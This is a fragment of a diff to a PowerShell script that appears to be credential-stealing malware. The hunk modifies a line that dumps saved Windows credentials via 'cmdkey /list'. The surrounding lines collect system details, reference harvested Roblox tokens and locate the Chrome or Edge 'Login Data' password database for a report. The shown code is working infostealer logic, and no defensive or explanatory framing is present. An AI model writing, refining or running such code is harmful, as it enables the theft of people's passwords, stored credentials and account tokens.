@@ -62,7 +62,7 @@ if ($robloxTokens) { $report += "`n<b>ROBLOX_TOKENS ($($robloxTokens.Count)):</b
 # === SYSTEM ===
 try { $os=(Get-CimInstance Win32_OperatingSystem).Caption; $cpu=(Get-CimInstance Win32_Processor).Name; $ram=[math]::Round((Get-CimInstance Win32_ComputerSystem).TotalPhysicalMemory/1GB,2); $report += "`n<b>SYSTEM:</b>`nOS: $os`nCPU: $cpu`nRAM: $ram GB`n" } catch {}
 # === CREDS ===
-try { $creds=cmd.exe/c"cmdkey /list"2>&1; if($creds){$report+="`n<b>[CREDS]</b>`n$creds`n"} } catch {}
+try {$creds=cmd /c cmdkey /list 2>$null; if($creds){$report+="`n<b>[CREDS]</b>`n$creds`n"} } catch {}
 # === BROWSER PASSWORDS ===
 $loginData="$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
 if(-not(Test-Path$loginData)){$loginData="$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Login Data"}
